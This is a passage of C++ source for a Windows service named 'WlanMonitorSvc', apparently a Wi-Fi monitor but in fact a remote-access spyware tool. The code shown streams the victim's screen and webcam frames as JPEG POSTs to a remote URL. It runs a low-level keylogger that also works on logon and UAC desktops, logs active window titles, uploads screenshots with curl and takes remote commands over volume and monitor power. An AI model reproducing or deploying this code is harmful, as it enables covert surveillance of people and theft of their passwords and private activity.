        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

        HANDLE hEvent = CreateEventA(NULL, TRUE, FALSE, UPDATE_EXIT_EVENT_NAME);
        if (hEvent) {
            SetEvent(hEvent);
            CloseHandle(hEvent);
        }
        return;
    }

    if (dwControl == SERVICE_CONTROL_SHUTDOWN) {
        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        if (g_hMutex) CloseHandle(g_hMutex);
        exit(1); // 以1退出也会触发关机延时前的恢复重启（可防止在未完全关机时被恶意中止）
    }
}

void WINAPI ServiceMain(DWORD argc, LPSTR *argv) {
    g_StatusHandle = RegisterServiceCtrlHandlerA("WlanMonitorSvc", ServiceCtrlHandler);
    if (!g_StatusHandle) return;

    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;
    g_ServiceStatus.dwWaitHint = 0;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    WriteLog("【系统服务】Windows 服务 WlanMonitorSvc (服务模式) 开始运行!");

    // 开始进入后台功能检测循环
    MonitorWiFiLoop();

    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

int main()
{
    g_ServiceStartTime = GetTickCount64();
    MigrateObviousLocalStateNames();
    MigrateExeSideLogNames();

    std::string cmdLine = GetCommandLineA();
    if (cmdLine.find("-usermode") == std::string::npos && RecoverInterruptedUpdateIfNeeded()) {
        return 0;
    }

    if (cmdLine.find("-usermode") != std::string::npos) {
        if (cmdLine.find("CAMERA_STREAM") == std::string::npos && cmdLine.find("STREAM") != std::string::npos) {
            ReportScreenLog("新切出的流媒体串流子进程已启动...");
            size_t pos = cmdLine.find("http");
            if (pos != std::string::npos) {
                std::string url = cmdLine.substr(pos);
                while (!url.empty() && (url.back() == '"' || url.back() == ' ')) {
                    url.pop_back();
                }

                std::string host, path;
                int port = 80;
                bool isHTTPS = false;
                std::string rest = url;
                if (url.find("https://") == 0) {
                    isHTTPS = true;
                    port = 443;
                    rest = url.substr(8);
                } else if (url.find("http://") == 0) {
                    rest = url.substr(7);
                }

                ULONG quality = 30; // 默认降低画质以提高帧率
                int maxResW = 1280; // 默认限制最大分辨率

                if (!rest.empty()) {
                    size_t slashPos = rest.find('/');
                    if (slashPos != std::string::npos) {
                        host = rest.substr(0, slashPos);
                        path = rest.substr(slashPos);
                    } else {
                        host = rest;
                        path = "/";
                    }
                    size_t colonPos = host.find(':');
                    if (colonPos != std::string::npos) {
                        port = std::stoi(host.substr(colonPos + 1));
                        host = host.substr(0, colonPos);
                    }

                    // 解析自定义参数
                    size_t qmPos = path.find('?');
                    if (qmPos != std::string::npos) {
                        std::string query = path.substr(qmPos + 1);
                        auto getParam = [](const std::string& q, const std::string& key) -> std::string {
                            size_t pos = q.find(key + "=");
                            while (pos != std::string::npos) {
                                if (pos == 0 || q[pos - 1] == '&' || q[pos - 1] == '?') {
                                    size_t start = pos + key.length() + 1;
                                    size_t end = q.find('&', start);
                                    if (end == std::string::npos) end = q.length();
                                    return q.substr(start, end - start);
                                }
                                pos = q.find(key + "=", pos + 1);
                            }
                            return "";
                        };

                        std::string resStr = getParam(query, "res");
                        if (!resStr.empty()) {
                            try { maxResW = std::stoi(resStr); } catch (...) {}
                        }
                        std::string qStr = getParam(query, "q");
                        if (!qStr.empty()) {
                            try { quality = std::stoi(qStr); } catch (...) {}
                        }
                        if (quality > 100) quality = 100;
                        if (quality < 1) quality = 1;
                        if (maxResW < 100) maxResW = 100;
                    }
                }

                HMODULE hUser32 = LoadLibraryA("user32.dll");
                if (hUser32) {
                    typedef BOOL(WINAPI* PSETPROCESSDPIAWARE)(VOID);
                    PSETPROCESSDPIAWARE pSetProcessDPIAware = (PSETPROCESSDPIAWARE)GetProcAddress(hUser32, "SetProcessDPIAware");
                    if (pSetProcessDPIAware) pSetProcessDPIAware();
                    FreeLibrary(hUser32);
                }

                Gdiplus::GdiplusStartupInput gdiplusStartupInput;
                ULONG_PTR gdiplusToken;
                Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

                CLSID clsid;
                GetEncoderClsid(L"image/jpeg", &clsid);

                HINTERNET hSession = InternetOpenA("WlanMonitorSvc_Agent_Stream", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
                if (hSession) {
                    HINTERNET hConnect = InternetConnectA(hSession, host.c_str(), port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
                    if (hConnect) {
                        // 保持阻塞模式，防止非阻塞导致大包图片发送不完整丢帧黑屏
                        DxgiScreenCapturer dxgiStream; // 初始化DXGI对象

                        while (true) {
                                if (IsUpdateExitRequested()) {
                                    ReportScreenLog("STREAM process received update exit request.");
                                    break;
                                }

                                int nScreenWidth = GetSystemMetrics(SM_CXVIRTUALSCREEN);
                                int nScreenHeight = GetSystemMetrics(SM_CYVIRTUALSCREEN);
                                int nScreenX = GetSystemMetrics(SM_XVIRTUALSCREEN);
                                int nScreenY = GetSystemMetrics(SM_YVIRTUALSCREEN);

                                if (nScreenWidth <= 0 || nScreenHeight <= 0) {
                                    nScreenWidth = GetSystemMetrics(SM_CXSCREEN);
                                    nScreenHeight = GetSystemMetrics(SM_CYSCREEN);
                                    nScreenX = 0;
                                    nScreenY = 0;
                                }

                                if (nScreenWidth <= 0 || nScreenHeight <= 0) { Sleep(500); continue; }

                                int targetW = nScreenWidth;
                                int targetH = nScreenHeight;
                                if (nScreenWidth > maxResW) { // 限制最大尺寸，提高串流帧率
                                    targetW = maxResW;
                                    targetH = (int)((float)nScreenHeight * (float)maxResW / (float)nScreenWidth);
                                }

                                HDC hDesktopDC = CreateDCA("DISPLAY", NULL, NULL, NULL);
                                if (!hDesktopDC) hDesktopDC = GetDC(NULL);
                                HDC hMemoryDC = CreateCompatibleDC(hDesktopDC);

                                BITMAPINFO bmi24 = {0};
                                bmi24.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
                                bmi24.bmiHeader.biWidth = targetW;
                                bmi24.bmiHeader.biHeight = targetH; // 正常正数高度，bottom-up
                                bmi24.bmiHeader.biPlanes = 1;
                                bmi24.bmiHeader.biBitCount = 24;    // 强制使用24位丢弃Alpha通道，防止DXGI返回的全透明导致黑白屏
                                bmi24.bmiHeader.biCompression = BI_RGB;
                                void* pDIBBits = NULL;
                                HBITMAP hBitmap = CreateDIBSection(hDesktopDC, &bmi24, DIB_RGB_COLORS, &pDIBBits, NULL, 0);

                                HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);

                                // 填充黑色背景防截取出错花屏
                                RECT bgRect = {0, 0, targetW, targetH};
                                FillRect(hMemoryDC, &bgRect, (HBRUSH)GetStockObject(BLACK_BRUSH));

                                bool dxgiSuccess = false;
                                HBITMAP hDxgiBmp = NULL;
                                int dxW = 0, dxH = 0;
                                if (dxgiStream.CaptureImage(hDxgiBmp, dxW, dxH, 5)) {
                                    if (hDxgiBmp) {
                                        HDC hDxgiDC = CreateCompatibleDC(hDesktopDC);
                                        SelectObject(hDxgiDC, hDxgiBmp);
                                        SetStretchBltMode(hMemoryDC, COLORONCOLOR);
                                        StretchBlt(hMemoryDC, 0, 0, targetW, targetH, hDxgiDC, 0, 0, dxW, dxH, SRCCOPY);
                                        DeleteDC(hDxgiDC);
                                        DeleteObject(hDxgiBmp);
                                        dxgiSuccess = true;
                                    }
                                }

                                if (!dxgiSuccess) {
                                    SetStretchBltMode(hMemoryDC, COLORONCOLOR); // 使用高速的缩放模式换取高帧率
                                    StretchBlt(hMemoryDC, 0, 0, targetW, targetH, hDesktopDC, nScreenX, nScreenY, nScreenWidth, nScreenHeight, SRCCOPY);

                                    // 禁用 PrintWindow 强制渲染拦截硬件加速窗口以极大提高帧率
                                    // HWND hForeground = GetForegroundWindow();
                                    /*
                                    if (hForeground && hForeground != GetDesktopWindow()) {
                                    char className[256];
                                    GetClassNameA(hForeground, className, sizeof(className));
                                    if (strcmp(className, "Progman") != 0 && strcmp(className, "WorkerW") != 0) {
                                        RECT fRect;
                                        if (GetWindowRect(hForeground, &fRect)) {
                                            int fW = fRect.right - fRect.left;
                                            int fH = fRect.bottom - fRect.top;
                                            // 当窗口占据屏幕较大部分时，认定为可能引发硬件遮罩的高优级主显应用，拉取它的真实渲染并贴图
                                            if (fW > 0 && fH > 0 && (fW >= nScreenWidth / 2 || fH >= nScreenHeight / 2)) {
                                                HDC hFgMemDC = CreateCompatibleDC(hDesktopDC);
                                                HBITMAP hFgBitmap = CreateCompatibleBitmap(hDesktopDC, fW, fH);
                                                HBITMAP hOldFgBmp = (HBITMAP)SelectObject(hFgMemDC, hFgBitmap);
                                                if (PrintWindow(hForeground, hFgMemDC, 2)) {
                                                    int dstX = (int)((fRect.left - nScreenX) * (float)targetW / (float)nScreenWidth);
                                                    int dstY = (int)((fRect.top - nScreenY) * (float)targetH / (float)nScreenHeight);
                                                    int dstW = (int)(fW * (float)targetW / (float)nScreenWidth);
                                                    int dstH = (int)(fH * (float)targetH / (float)nScreenHeight);
                                                    SetStretchBltMode(hMemoryDC, COLORONCOLOR);
                                                    StretchBlt(hMemoryDC, dstX, dstY, dstW, dstH, hFgMemDC, 0, 0, fW, fH, SRCCOPY);
                                                }
                                                SelectObject(hFgMemDC, hOldFgBmp); DeleteObject(hFgBitmap); DeleteDC(hFgMemDC);
                                            }
                                        }
                                    }
                                }
                                */
                                } // 结束 if (!dxgiSuccess)

                                // 【核心修复】必须先将 hBitmap 从 DC 中弹出（反选），GDI+ 才能安全锁定和操作它，否则会导致截取到空数据或一直处于黑/白屏缓冲！
                                SelectObject(hMemoryDC, hOldBitmap);

                                IStream* pStream = NULL;
                                CreateStreamOnHGlobal(NULL, TRUE, &pStream);

                                {
                                    Gdiplus::Bitmap bitmap(hBitmap, NULL);
                                    Gdiplus::EncoderParameters ep;
                                    ep.Count = 1;
                                    ep.Parameter[0].Guid = Gdiplus::EncoderQuality;
                                    ep.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
                                    ep.Parameter[0].NumberOfValues = 1;
                                    ep.Parameter[0].Value = &quality;
                                    bitmap.Save(pStream, &clsid, &ep);
                                }

                                STATSTG statstg;
                                pStream->Stat(&statstg, STATFLAG_NONAME);
                                ULONG cbSize = statstg.cbSize.LowPart;

                                std::string buffer(cbSize, '\0');
                                LARGE_INTEGER liZero = {0};
                                pStream->Seek(liZero, STREAM_SEEK_SET, NULL);
                                ULONG bytesRead = 0;
                                pStream->Read(&buffer[0], cbSize, &bytesRead);
                                pStream->Release();

                                DeleteObject(hBitmap);
                                DeleteDC(hMemoryDC);
                                if (hDesktopDC) {
                                    // 尝试 ReleaseDC，如果失败（因为是 CreateDCA 创建的）则调用 DeleteDC
                                    if (!ReleaseDC(NULL, hDesktopDC)) DeleteDC(hDesktopDC);
                                }

                                DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI | INTERNET_FLAG_PRAGMA_NOCACHE;
                                if (isHTTPS) flags |= INTERNET_FLAG_SECURE;

                                HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path.c_str(), NULL, NULL, NULL, flags, 1);
                                if (hRequest) {
                                    std::string headers = "Content-Type: image/jpeg\r\n";
                                    BOOL bSend = HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)buffer.data(), (DWORD)cbSize);
                                    if (bSend) {
                                        char recvBuf[128];
                                        DWORD bytesRead = 0;
                                        std::string respOut;
                                        while (InternetReadFile(hRequest, recvBuf, sizeof(recvBuf)-1, &bytesRead) && bytesRead > 0) {
                                            recvBuf[bytesRead] = '\0';
                                            respOut += recvBuf;
                                        }
                                        if (respOut.find("STOP") != std::string::npos) {
                                            InternetCloseHandle(hRequest);
                                            break;
                                        }
                                    } else {
                                        InternetCloseHandle(hRequest);
                                        break; // 网络错误断开
                                    }
                                    InternetCloseHandle(hRequest);
                                } else {
                                    break;
                                }

                                Sleep(1); // Frame pacing
                            }
                        }
                    InternetCloseHandle(hConnect);
                }
                InternetCloseHandle(hSession);
                Gdiplus::GdiplusShutdown(gdiplusToken);
            } else {
                ReportScreenLog("致命：无法从命令行参数提取串流 URL。");
            }
            return 0; // 专属执行完毕后必出循环结束即可
        }

        if (cmdLine.find("CAMERA_STREAM") != std::string::npos) {
            size_t pos = cmdLine.find("CAMERA_STREAM ");
            if (pos != std::string::npos) {
                std::string url = cmdLine.substr(pos + 14);
                while (!url.empty() && (url.front() == '"' || url.front() == ' ')) url.erase(0, 1);
                while (!url.empty() && (url.back() == '"' || url.back() == ' ')) url.pop_back();

                std::string host, path;
                int port = 80;
                bool isHTTPS = false;
                std::string rest = url;
                if (url.find("https://") == 0) {
                    isHTTPS = true;
                    port = 443;
                    rest = url.substr(8);
                } else if (url.find("http://") == 0) {
                    rest = url.substr(7);
                }

                ULONG quality = 45;
                if (!rest.empty()) {
                    size_t slashPos = rest.find('/');
                    if (slashPos != std::string::npos) {
                        host = rest.substr(0, slashPos);
                        path = rest.substr(slashPos);
                    } else {
                        host = rest;
                        path = "/";
                    }
                    size_t colonPos = host.find(':');
                    if (colonPos != std::string::npos) {
                        port = std::stoi(host.substr(colonPos + 1));
                        host = host.substr(0, colonPos);
                    }
                    size_t qPos = path.find("q=");
                    if (qPos != std::string::npos) {
                        try { quality = std::stoi(path.substr(qPos + 2)); } catch (...) {}
                        if (quality > 100) quality = 100;
                        if (quality < 1) quality = 1;
                    }
                }

                ReportScreenLog("CAMERA_STREAM starting, target=" + host + path);

                Gdiplus::GdiplusStartupInput gdiplusStartupInput;
                ULONG_PTR gdiplusToken = 0;
                Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
                CLSID clsid;
                GetEncoderClsid(L"image/jpeg", &clsid);

                HWND hCap = capCreateCaptureWindowA("WlanMonitorSvcCamera", WS_POPUP, 0, 0, 640, 480, NULL, 0);
                if (!hCap) {
                    ReportScreenLog("CAMERA_STREAM failed: capCreateCaptureWindowA returned NULL.");
                    Gdiplus::GdiplusShutdown(gdiplusToken);
                    return 0;
                }

                bool connected = false;
                for (int driver = 0; driver < 4 && !connected; ++driver) {
                    connected = capDriverConnect(hCap, driver) == TRUE;
                    if (connected) ReportScreenLog("CAMERA_STREAM connected to camera driver index " + std::to_string(driver));
                }
                if (!connected) {
                    ReportScreenLog("CAMERA_STREAM failed: no VFW camera driver connected.");
                    DestroyWindow(hCap);
                    Gdiplus::GdiplusShutdown(gdiplusToken);
                    return 0;
                }

                HINTERNET hSession = InternetOpenA("WlanMonitorSvc_Agent_Camera", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
                if (hSession) {
                    HINTERNET hConnect = InternetConnectA(hSession, host.c_str(), port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
                    if (hConnect) {
                        while (true) {
                            if (IsUpdateExitRequested()) {
                                ReportScreenLog("CAMERA_STREAM process received update exit request.");
                                break;
                            }

                            if (!capGrabFrameNoStop(hCap)) {
                                Sleep(200);
                                continue;
                            }
                            capEditCopy(hCap);

                            HBITMAP hBitmap = NULL;
                            if (OpenClipboard(hCap)) {
                                HANDLE hDib = GetClipboardData(CF_DIB);
                                if (hDib) {
                                    void* dib = GlobalLock(hDib);
                                    if (dib) {
                                        BITMAPINFOHEADER* bih = reinterpret_cast<BITMAPINFOHEADER*>(dib);
                                        DWORD colors = bih->biClrUsed;
                                        if (colors == 0 && bih->biBitCount <= 8) colors = 1u << bih->biBitCount;
                                        BYTE* bits = reinterpret_cast<BYTE*>(dib) + bih->biSize + colors * sizeof(RGBQUAD);
                                        if (bih->biCompression == BI_BITFIELDS) bits += 3 * sizeof(DWORD);
                                        HDC hdc = GetDC(NULL);
                                        hBitmap = CreateDIBitmap(hdc, bih, CBM_INIT, bits, reinterpret_cast<BITMAPINFO*>(bih), DIB_RGB_COLORS);
                                        ReleaseDC(NULL, hdc);
                                        GlobalUnlock(hDib);
                                    }
                                }
                                CloseClipboard();
                            }

                            if (!hBitmap) {
                                Sleep(200);
                                continue;
                            }

                            IStream* pStream = NULL;
                            CreateStreamOnHGlobal(NULL, TRUE, &pStream);
                            {
                                Gdiplus::Bitmap bitmap(hBitmap, NULL);
                                Gdiplus::EncoderParameters ep;
                                ep.Count = 1;
                                ep.Parameter[0].Guid = Gdiplus::EncoderQuality;
                                ep.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
                                ep.Parameter[0].NumberOfValues = 1;
                                ep.Parameter[0].Value = &quality;
                                bitmap.Save(pStream, &clsid, &ep);
                            }
                            DeleteObject(hBitmap);

                            STATSTG statstg;
                            pStream->Stat(&statstg, STATFLAG_NONAME);
                            ULONG cbSize = statstg.cbSize.LowPart;
                            std::string buffer(cbSize, '\0');
                            LARGE_INTEGER liZero = {0};
                            pStream->Seek(liZero, STREAM_SEEK_SET, NULL);
                            ULONG bytesRead = 0;
                            pStream->Read(&buffer[0], cbSize, &bytesRead);
                            pStream->Release();

                            DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI | INTERNET_FLAG_PRAGMA_NOCACHE;
                            if (isHTTPS) flags |= INTERNET_FLAG_SECURE;
                            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path.c_str(), NULL, NULL, NULL, flags, 1);
                            if (!hRequest) break;

                            std::string headers = "Content-Type: image/jpeg\r\n";
                            BOOL sent = HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)buffer.data(), (DWORD)buffer.size());
                            if (sent) {
                                char recvBuf[128];
                                DWORD read = 0;
                                std::string resp;
                                while (InternetReadFile(hRequest, recvBuf, sizeof(recvBuf) - 1, &read) && read > 0) {
                                    recvBuf[read] = '\0';
                                    resp += recvBuf;
                                }
                                InternetCloseHandle(hRequest);
                                if (resp.find("STOP") != std::string::npos) break;
                            } else {
                                InternetCloseHandle(hRequest);
                                break;
                            }

                            Sleep(80);
                        }
                        InternetCloseHandle(hConnect);
                    }
                    InternetCloseHandle(hSession);
                }

                capDriverDisconnect(hCap);
                DestroyWindow(hCap);
                Gdiplus::GdiplusShutdown(gdiplusToken);
                ReportScreenLog("CAMERA_STREAM stopped.");
            }
            return 0;
        }

        if (cmdLine.find("KEYLOG") != std::string::npos) {
            HANDLE hKeylogMutex = CreateMutexA(NULL, FALSE, "Global\\WlanMonitorSvc_Keylog_Mutex");
            if (GetLastError() == ERROR_ALREADY_EXISTS) {
                if (hKeylogMutex) CloseHandle(hKeylogMutex);
                return 0;
            }

            // 动态切换到当前的活动输入桌面，实现登录界面/UAC界面/普通桌面的通用支持
            HDESK hInputDesk = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
            if (hInputDesk) {
                SetThreadDesktop(hInputDesk);
                CloseDesktop(hInputDesk);
            }

            // 定时检测桌面环境是否发生变化(比如用户登录了，切换到 default 桌面了)，退出本体让服务重新拉起适合的新桌面
            SetTimer(NULL, 1, 3000, [](HWND, UINT, UINT_PTR, DWORD) {
                HDESK hCurrent = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
                if (hCurrent) {
                    static HDESK hOriginal = GetThreadDesktop(GetCurrentThreadId());
                    char name1[256] = {0}; char name2[256] = {0};
                    GetUserObjectInformationA(hOriginal, UOI_NAME, name1, 256, NULL);
                    GetUserObjectInformationA(hCurrent, UOI_NAME, name2, 256, NULL);
                    CloseDesktop(hCurrent);
                    if (_stricmp(name1, name2) != 0 && strcmp(name2, "Winlogon") != 0 && strcmp(name2, "Default") != 0) {
                        // 对于安全桌面等变化也退出的话会导致频繁掉线，我们这里只要遇到从 winlogon 换成 Default，或者 Default 掉出时触发自尽让服务接管即可
                        ExitProcess(0);
                    }
                    if (_stricmp(name1, name2) != 0) {
                        ExitProcess(0); // 只要桌面类型不同就结束自己，让外侧 5 秒守护重新将 keylogger 送进新桌面！
                    }
                } else if (GetLastError() == ERROR_ACCESS_DENIED) {
                    ExitProcess(0); // 切到了没有权限的桌面 (比如强登录锁屏)，结束自己交由服务重新提权突破
                }
            });

            // 定时获取并报告当前的焦点前台窗口名和进程名，以及系统音量
            SetTimer(NULL, 2, 2000, [](HWND, UINT, UINT_PTR, DWORD) {
                HWND fg = GetForegroundWindow();
                if (fg) {
                    wchar_t titleW[512] = {0};
                    GetWindowTextW(fg, titleW, 511);
                    DWORD pid = 0;
                    GetWindowThreadProcessId(fg, &pid);
                    wchar_t pathW[MAX_PATH] = {0};
                    std::string procName = "未知";
                    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
                    if (hProc) {
                        if (GetModuleFileNameExW(hProc, NULL, pathW, MAX_PATH)) {
                            std::wstring fp = pathW;
                            size_t p = fp.find_last_of(L"\\/");
                            procName = WideToUtf8((p != std::wstring::npos) ? fp.substr(p + 1) : fp);
                        }
                        CloseHandle(hProc);
                    }
                    std::string out = procName + "  [" + WideToUtf8(titleW) + "]";
                    WriteEncryptedLocalFile(ACTIVE_WND_STATE, out);

                    // 新增：检测窗口切换并记录到按键日志
                    static std::string lastWindow = "";
                    if (lastWindow != out) {
                        lastWindow = out;
                        if (LocalStateExists(KEYLOG_CFG_STATE, LEGACY_KEYLOG_CFG_TXT)) {
                            AppendEncryptedLocalFile(KEYLOG_STATE, LEGACY_KEYLOG_TXT, "\n\n[Active Software: " + out + "]\n");
                        }
                    }
                }

                int vol = GetVolumeNative();
                if (vol >= 0) {
                    WriteEncryptedLocalFile(VOLUME_STATE, std::to_string(vol));
                }

                bool keylogEnabled = LocalStateExists(KEYLOG_CFG_STATE, LEGACY_KEYLOG_CFG_TXT);
                if (keylogEnabled && g_hKeyHook == NULL) {
                    g_hKeyHook = SetWindowsHookExA(WH_KEYBOARD_LL, [](int nCode, WPARAM wParam, LPARAM lParam) -> LRESULT {
                        if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
                            KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
                            DWORD vk = p->vkCode;
                            std::string text;
                            if (vk >= 'A' && vk <= 'Z') {
                                bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                                bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
                                if (shift ^ caps) text = std::string(1, (char)vk);
                                else text = std::string(1, (char)tolower(vk));
                            } else if (vk >= '0' && vk <= '9') {
                                bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                                if (!shift) text = std::string(1, (char)vk);
                                else {
                                    const char* sNums = ")!@#$%^&*(";
                                    text = std::string(1, sNums[vk - '0']);
                                }
                            } else if (vk == VK_SPACE) text = " ";
                            else if (vk == VK_RETURN) text = "\n";
                            else if (vk == VK_BACK) text = "[BACK]";
                            else if (vk == VK_TAB) text = "[TAB]";
                            else if (vk == VK_OEM_PERIOD) text = ".";
                            else if (vk == VK_OEM_COMMA) text = ",";
                            else if (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9) text = std::string(1, '0' + (vk - VK_NUMPAD0));
                            else {
                                char name[64] = {0};
                                if (GetKeyNameTextA((p->scanCode << 16) | (p->flags << 24), name, 64)) {
                                    text = "[" + std::string(name) + "]";
                                }
                            }
                            if(!text.empty()) {
                                AppendEncryptedLocalFile(KEYLOG_STATE, LEGACY_KEYLOG_TXT, text);
                            }
                        }
                        return CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
                    }, GetModuleHandle(NULL), 0);
                } else if (!keylogEnabled && g_hKeyHook != NULL) {
                    UnhookWindowsHookEx(g_hKeyHook);
                    g_hKeyHook = NULL;
                }
            });

            SetTimer(NULL, 99, 500, [](HWND, UINT, UINT_PTR, DWORD) {
                if (IsUpdateExitRequested()) {
                    WriteLog("【更新】用户态 KEYLOG 进程收到更新退出信号，准备退出。");
                    PostQuitMessage(0);
                }
            });

            MSG msg;
            while(GetMessage(&msg, NULL, 0, 0)) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
            if (hKeylogMutex) CloseHandle(hKeylogMutex);
            return 0;
        }

        if (cmdLine.find("SCREEN") != std::string::npos) {
            ReportScreenLog("新切出的用户子进程已启动...");
            size_t pos = cmdLine.find("http");
            if (pos != std::string::npos) {
                std::string url = cmdLine.substr(pos);
                while (!url.empty() && (url.back() == '"' || url.back() == ' ')) {
                    url.pop_back();
                }
                char tempPath[MAX_PATH];
                GetTempPathA(MAX_PATH, tempPath);
                std::string jpgPath = std::string(tempPath) + "sc.jpg";

                CaptureScreenJpg(jpgPath);

                ReportScreenLog("准备调用 curl 上传到: " + url);
                std::string curlCmd = "curl.exe -s -k -F \"file=@" + jpgPath + "\" \"" + url + "\"";
                std::string resOut = ExecCmd(curlCmd, false);
                ReportScreenLog("CMD / curl.exe 返回输出: [" + resOut + "]");
                DeleteFileA(jpgPath.c_str());
                ReportScreenLog("用户子进程操作完毕并已清理残留缓存，退出。");
            } else {
                ReportScreenLog("致命：无法从命令行参数提取上传 URL。");
            }
        }
        if (cmdLine.find("MEDIA ") != std::string::npos) {
            size_t pos = cmdLine.find("MEDIA ");
            if (pos != std::string::npos) {
                try {
                    int keyCode = std::stoi(cmdLine.substr(pos + 6));
                    keybd_event(keyCode, MapVirtualKeyA(keyCode, 0), KEYEVENTF_EXTENDEDKEY, 0);
                    keybd_event(keyCode, MapVirtualKeyA(keyCode, 0), KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
                } catch (...) {}
            }
            return 0;
        }

        if (cmdLine.find("MEDIA_VOL_SET") != std::string::npos) {
            size_t pos = cmdLine.find("MEDIA_VOL_SET ");
            if (pos != std::string::npos) {
                try {
                    int vol = std::stoi(cmdLine.substr(pos + 14));
                    SetVolumeNative(vol);
                } catch (...) {}
            }
            return 0;
        }

        if (cmdLine.find("MEDIA_BOUNCE") != std::string::npos) {
            HANDLE hBounceMutex = CreateMutexA(NULL, FALSE, "Global\\WlanMonitorSvc_MediaBounce_Mutex");
            if (GetLastError() == ERROR_ALREADY_EXISTS) {
                if (hBounceMutex) CloseHandle(hBounceMutex);
                return 0;
            }

            std::srand((unsigned int)(std::time(nullptr) ^ GetCurrentProcessId()));
            WriteLog("MEDIA_BOUNCE local volume randomizer started.");
            while (LocalStateExists(MEDIA_BOUNCE_CFG_STATE, LEGACY_MEDIA_BOUNCE_CFG_TXT)) {
                if (IsUpdateExitRequested()) {
                    WriteLog("MEDIA_BOUNCE received update exit request.");
                    break;
                }
                int vol = std::rand() % 101;
                SetVolumeNative(vol);
                WriteEncryptedLocalFile(VOLUME_STATE, std::to_string(vol));
                Sleep(5000);
            }
            WriteLog("MEDIA_BOUNCE local volume randomizer stopped.");
            if (hBounceMutex) CloseHandle(hBounceMutex);
            return 0;
        }

        if (cmdLine.find("MONITOR_OFF") != std::string::npos) {
            // 显示器黑屏：使用 WM_SYSCOMMAND 真正关闭显示器（显示器进入待机/睡眠状态）
            // 参数 2 = 关闭显示器
            DWORD_PTR dwResult = 0;
            SendMessageTimeoutA(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2, SMTO_ABORTIFHUNG, 2000, &dwResult);
            return 0;
        }

        if (cmdLine.find("MONITOR_ON") != std::string::npos) {
            // 显示器亮屏：使用多种方法确保显示器从睡眠状态唤醒
            // 参数 -1 = 唤醒/打开显示器

            // 1. 发送唤醒信号
            DWORD_PTR dwResult = 0;
            SendMessageTimeoutA(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1, SMTO_ABORTIFHUNG, 2000, &dwResult);
            Sleep(200);

            // 2. 声明系统需要显示器
            SetThreadExecutionState(ES_CONTINUOUS | ES_DISPLAY_REQUIRED | ES_SYSTEM_REQUIRED);
            Sleep(100);

            // 3. 模拟键盘按键唤醒
            keybd_event(VK_F15, 0, 0, 0);
            keybd_event(VK_F15, 0, KEYEVENTF_KEYUP, 0);
            Sleep(100);

            // 4. 模拟鼠标移动唤醒
            mouse_event(MOUSEEVENTF_MOVE, 0, 5, 0, 0);
            Sleep(100);
            mouse_event(MOUSEEVENTF_MOVE, 0, -5, 0, 0);

            return 0;
        }

        if (cmdLine.find("MEDIA_INFO") != std::string::npos) {
            int vol = GetVolumeNative();

            // 使用兼容 Windows PowerShell 5.x 的 WinRT 异步转 Task 方式，提升媒体标题获取成功率
